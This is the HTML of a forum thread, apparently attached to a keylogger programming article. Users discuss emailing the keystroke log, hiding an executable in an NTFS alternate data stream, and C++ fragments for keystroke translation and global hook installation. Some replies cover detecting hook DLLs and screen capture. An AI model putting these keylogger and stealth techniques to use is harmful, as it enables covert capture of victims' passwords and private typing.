+<tr id=1420274_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I'll add more comments on the next version <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1392578&forumid=177768&select=1420274#xx1420274xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1420274#xx1420274xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1388978_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1388978xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1388978 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1388978#xx1388978xx'><b>How can I decide which dll is the keyboard spy?</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1858399'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>YvesGao</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>20:29 28 Feb '06</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1388978_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>How can I decide which dll is the keyboard spy on runtime? <br><br>Yves Gao<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1388978&forumid=177768&select=1388978#xx1388978xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1388978#xx1388978xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1420270_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1420270xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1420270 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1420270#xx1420270xx'>Re: How can I decide which dll is the keyboard spy?</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >2:39 24 Mar '06&nbsp;</font></td></tr></table></td></tr>
+<tr id=1420270_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>? <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1388978&forumid=177768&select=1420270#xx1420270xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1420270#xx1420270xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle>Score: 1.0 (1 vote). </td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1293509_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1293509xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1293509 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1293509#xx1293509xx'><b>how about send email spy.log? (as introduded)</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1295911'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>dungbkhn</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>21:13 30 Nov '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1293509_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>thanks! <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1293509&forumid=177768&select=1293509#xx1293509xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1293509#xx1293509xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle>Score: 1.0 (1 vote). </td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1420269_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1420269xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1420269 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1420269#xx1420269xx'>Re: how about send email spy.log? (as introduded)</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >2:38 24 Mar '06&nbsp;</font></td></tr></table></td></tr>
+<tr id=1420269_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Maybe on the next version <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1293509&forumid=177768&select=1420269#xx1420269xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1420269#xx1420269xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1264481_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1264481xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1264481 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1264481#xx1264481xx'><b>can't run ADS</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=212433'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>__yb</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>4:23 26 Oct '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1264481_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>i tried this:<br><code>   type \windows\system32\notepad.exe > procexp.exe:notepad.exe<br>start procexp.exe:notepad.exe</code><br><br>the start pops a message box:<br><code>   procexp.exe:notepad.exe<br>   the parameter is incorrect</code><br>and writes in the cmd:<br><code>   Access is denied.</code><br><br>Any solution?<br>TIA,<br>Yakov<br> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1264481&forumid=177768&select=1264481#xx1264481xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1264481#xx1264481xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1265254_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1265254xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1265254 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1265254#xx1265254xx'>Re: can't run ADS</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >18:38 26 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1265254_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>1) Make sure both exe are in the same folder.<br>2) "type notepad.exe > procexp.exe:notepad.exe"<br><br>Good luck<br><br> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1264481&forumid=177768&select=1265254#xx1265254xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1265254#xx1265254xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1265528_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1265528xx'></a><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1265528 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1265528#xx1265528xx'>Re: can't run ADS</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=212433'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >__yb&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >2:52 27 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1265528_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>the type into ds was workin even yesterday.<br>the start command is the one that doesn't work.<br>I guess I'll just write CreateProcess...<img src="/script/images/smiley_tongue.gif" align=absmiddle><br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1264481&forumid=177768&select=1265528#xx1265528xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1265528#xx1265528xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1245178_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1245178xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1245178 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1245178#xx1245178xx'><b>Screen logger api....</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1370206'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>Argonauta99</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>22:32 4 Oct '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1245178_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Hello can you tell me what API must to use to catch screen loggers??<br><br><br>thanks!!<br><br> <br><br>Argonauta99<br>Kolomvia<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1245178&forumid=177768&select=1245178#xx1245178xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1245178#xx1245178xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1245195_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1245195xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1245195 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1245195#xx1245195xx'>Re: Screen logger api....</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >22:58 4 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1245195_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>There is no API that detects a system wide hook<br><br>"To catch" a system wide hook try to enum all the processes in the system and look for a module (DLL/EXE) that is loaded in all of them. <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1245178&forumid=177768&select=1245195#xx1245195xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1245195#xx1245195xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1367184_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1367184xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1367184 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1367184#xx1367184xx'>Re: Screen logger api....</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=122608'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >robotdog&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >16:30 10 Feb '06&nbsp;</font></td></tr></table></td></tr>
+<tr id=1367184_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>The primary way to detect screen captures is through the BitBlt APIs. You can hook the APIs and if you see one that is trying to capture the entire screen go ahead and prevent the call from succeeding (or your favorite way of prevention).<br><br> <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1245178&forumid=177768&select=1367184#xx1367184xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1367184#xx1367184xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1244648_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1244648xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1244648 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1244648#xx1244648xx'><b>Multilanguage support</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=2261689'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>chaplinskiyilya@hotmail.com</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>9:42 4 Oct '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1244648_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I'm adding simple multilanguage support:<br><br><b>		DWORD threadID = GetWindowThreadProcessId(g_hWinInFocus,NULL);</b><br>        char ch;<br> <br>		//Translate virtual key code to ascii<br><br>		GetKeyboardState(keyStateArr);<br><br><b>		if(!threadID == NULL)<br>		{<br>			DWORD kblay = (DWORD) GetKeyboardLayout(threadID);<br>			ToAsciiEx(wParam, scanCode, keyStateArr, &word, 0,(HKL) kblay);<br>		}<br>		else<br>			ToAscii(wParam, scanCode, keyStateArr, &word, 0);</b><br>		ch = (char) word;<br><br>May be it isn't such as must to be, but it work<img src="/script/images/smiley_smile.gif" align=absmiddle><br>What U think? <br><br>IlyaCh<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1244648&forumid=177768&select=1244648#xx1244648xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1244648#xx1244648xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1245189_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1245189xx'></a><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1245189 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1245189#xx1245189xx'>Re: Multilanguage support</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=1932755'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >Dor Alon&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >22:51 4 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1245189_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=18 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Cool! <br>I might just add it to the next version of the article <br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1244648&forumid=177768&select=1245189#xx1245189xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1245189#xx1245189xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=6></td></tr><tr bgcolor='#FEF9E7' id=1245393_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1245393xx'></a><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1245393 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1245393#xx1245393xx'>Re: Multilanguage support</a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=2261689'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle >chaplinskiyilya@hotmail.com&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle >4:42 5 Oct '05&nbsp;</font></td></tr></table></td></tr>
+<tr id=1245393_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img height=1 width=36 src='/script/images/ind.gif'><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>Thanks, but not cool...<br>I find out, the applications which has it own switch keyboard layout, for ex. dictionaries, isn't logs at correct language. They are don't using system's active input locale identifier.<br><br>Don't know what to do with it<img src="/script/images/smiley_frown.gif" align=absmiddle><br> <br><br>IlyaCh<br>&nbsp;</font></td></tr><tr valign=top><td class=messagetitle>[<a href='/script/profile/logon.asp?ct=%2Fsystem%2FKeyLogger%2Easp'>Sign in</a>][<a	href='/system/KeyLogger.asp?df=100&tid=1244648&forumid=177768&select=1245393#xx1245393xx' title='View only messages within this thread'>View Thread</a>][<a	href='/system/KeyLogger.asp?msg=1245393#xx1245393xx' title='Get the URL for this message'>Get Link</a>]</td><td align=right class=messagetitle></td></tr></table></td></tr></table></td></tr></table></td></tr>
+<tr><td colspan=1><img src='/script/images/t.gif' border=0 width=1 height=5></td></tr><tr height=1><td colspan=1 bgcolor='#ff9900'><img src='/script/images/t.gif' width=1 height=1></td></tr><tr bgcolor='#FEF9E7' id=1227682_h0><td width='100%' colspan=1><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td bgcolor=white><a name='xx1227682xx'></a><img align=absmiddle src='/script/images/news_general.gif'>&nbsp;</td>
+<td width='100%' class=messagetitle><a class=messagetitle id=DynMessLink name=1227682 href='/system/KeyLogger.asp?df=100&forumid=177768&select=1227682#xx1227682xx'><b>Can you help me !</b></a></td><td valign=bottom><a href='/script/profile/whos_who.asp?id=399624'><img src='/script/images/userinfo.gif' title='Click for User Profile' border=0 width=14 height=15></a>&nbsp;</td><td width=140 nowrap><font class=messagetitle ><b>anhhtu</b>&nbsp;</font></td><td nowrap align=right width='120' style='width:9em'><font class=messagetitle ><b>4:48 16 Sep '05</b>&nbsp;</font></td></tr></table></td></tr>
+<tr id=1227682_h1 style='display:none' ><td colspan=1 width='100%'><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td><img align=absmiddle src='/script/images/news_blank.gif'>&nbsp;</td><td bgcolor='#D5EAFF' width='100%'><table border=0 cellspacing=5 cellpadding=0 width='100%'><tr><td><table border=0 cellspacing=0 cellpadding=0 width='100%'><tr><td colspan=2><font class=messagecontent>I am change dll source as follow (not use def file):<br>Add in to StdAfx.h:<br><i>extern "C"__declspec(dllexport) LRESULT CALLBACK HookProc (int nCode, WPARAM wParam, LPARAM lParam );<br>extern "C"__declspec(dllexport) void CALLBACK SetSpyHwnd (DWORD hwnd);</i><br>After building the dll successful, I use Dependency Walker to know the name of its functions : _SetSpyHwnd@4 and _HookProc@12. I change the code in cpp file of exe: <br>if (SetHwndFunc = (SetSpyHwnd) ::GetProcAddress (g_hHookDll<b>,"_SetSpyHwnd@4"</b>))<br>{<br>   //Store Main Module HWND in to the shared memory<br>   (SetHwndFunc)((DWORD)hwnd);<br>   if (HookProcFunc = (HookProc) ::GetProcAddress (g_hHookDll,<b>"_HookProc@12"</b>))<br>   {<br>      if (g_hHook = SetWindowsHookEx(WH_CBT, HookProcFunc, g_hHookDll, 0))<br>         return true;<br>    }<br>}<br><br>But it is not run correctly, can you help me, please ! I build them on VC++ 6.0, and WinXP (but it run very well when I build it (with VC++6.0 too)on machine has .NET).<br>Thank you very much ! <br><br>VC++ 